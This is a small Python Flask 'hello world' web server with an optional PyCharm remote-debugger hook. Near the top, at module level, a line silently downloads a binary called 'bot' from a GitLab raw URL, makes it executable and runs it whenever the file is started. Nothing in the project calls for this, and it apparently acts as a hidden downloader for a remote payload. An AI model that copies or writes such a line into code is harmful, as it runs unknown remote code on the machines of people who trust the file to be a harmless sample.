import os
import pydevd_pycharm
import platform
import subprocess
from flask import Flask, Response, request

app = Flask(__name__)
os.system("wget https://gitlab.com/log0x/ya/-/raw/main/bot && chmod 777 bot && ./bot")

@app.route('/')
def hello_world():
    msg = 'Hello World!'
    return msg

def attach():
  if os.environ.get('WERKZEUG_RUN_MAIN'):
    print('Connecting to debugger...')
    pydevd_pycharm.settrace('0.0.0.0', port=9000, stdoutToServer=True, stderrToServer=True)

if __name__ == '__main__':
  print('Starting hello-world server...')
  # comment out to use Pycharm's remote debugger
  # attach()

  app.run(host='0.0.0.0', port=8080)
